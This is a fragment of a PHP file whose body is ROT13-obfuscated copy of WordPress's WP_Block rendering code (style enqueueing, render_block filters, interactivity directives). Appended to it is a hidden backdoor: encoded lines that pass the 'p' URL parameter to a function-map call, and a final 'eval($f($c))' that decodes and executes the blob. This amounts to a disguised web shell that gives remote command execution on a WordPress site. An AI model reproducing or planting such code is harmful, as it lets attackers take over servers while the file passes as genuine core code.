		 * Sbe Pber oybpxf, gurfr fglyrf ner bayl radhrhrq vs `jc_fubhyq_ybnq_frcnengr_pber_oybpx_nffrgf()` ergheaf
		 * gehr. Bgurejvfr gurfr `jc_radhrhr_fglyr()` pnyyf jvyy abg unir nal rssrpg, nf gur Pber oybpxf ner erylvat ba
		 * gur pbzovarq 'jc-oybpx-yvoenel' fglyrfurrg vafgrnq, juvpu vf hapbaqvgvbanyyl radhrhrq.
		 */
		vs ( ( ! rzcgl( $guvf->oybpx_glcr->fglyr_unaqyrf ) ) ) {
			sbernpu ( $guvf->oybpx_glcr->fglyr_unaqyrf nf $fglyr_unaqyr ) {
				jc_radhrhr_fglyr( $fglyr_unaqyr );
			}
		}

		vs ( ( ! rzcgl( $guvf->oybpx_glcr->ivrj_fglyr_unaqyrf ) ) ) {
			sbernpu ( $guvf->oybpx_glcr->ivrj_fglyr_unaqyrf nf $ivrj_fglyr_unaqyr ) {
				jc_radhrhr_fglyr( $ivrj_fglyr_unaqyr );
			}
		}

		/**
		 * Svygref gur pbagrag bs n fvatyr oybpx.
		 *
		 * @fvapr 5.0.0
		 * @fvapr 5.9.0 Gur `$vafgnapr` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat   $oybpx_pbagrag Gur oybpx pbagrag.
		 * @cnenz neenl    $oybpx         Gur shyy oybpx, vapyhqvat anzr naq nggevohgrf.
		 * @cnenz JC_Oybpx $vafgnapr      Gur oybpx vafgnapr.
		 */
		$oybpx_pbagrag = nccyl_svygref( 'eraqre_oybpx', $oybpx_pbagrag, $guvf->cnefrq_oybpx, $guvf );

		/**
		 * Svygref gur pbagrag bs n fvatyr oybpx.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$anzr`, ersref gb
		 * gur oybpx anzr, r.t. \"pber/cnentencu\".
		 *
		 * @fvapr 5.7.0
		 * @fvapr 5.9.0 Gur `$vafgnapr` cnenzrgre jnf nqqrq.
		 *
		 * @cnenz fgevat   $oybpx_pbagrag Gur oybpx pbagrag.
		 * @cnenz neenl    $oybpx         Gur shyy oybpx, vapyhqvat anzr naq nggevohgrf.
		 * @cnenz JC_Oybpx $vafgnapr      Gur oybpx vafgnapr.
		 */
		$oybpx_pbagrag = nccyl_svygref( \"eraqre_oybpx_{$guvf->anzr}\", $oybpx_pbagrag, $guvf->cnefrq_oybpx, $guvf );

		vs ( $ebbg_vagrenpgvir_oybpx === $guvf ) {
			// Gur ebbg vagrenpgvir oybpx unf svavfurq eraqrevat. Gvzr gb cebprff qverpgvirf.
			$oybpx_pbagrag          = jc_vagrenpgvivgl_cebprff_qverpgvirf( $oybpx_pbagrag );
			$ebbg_vagrenpgvir_oybpx = ahyy;
		}

		erghea $oybpx_pbagrag;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>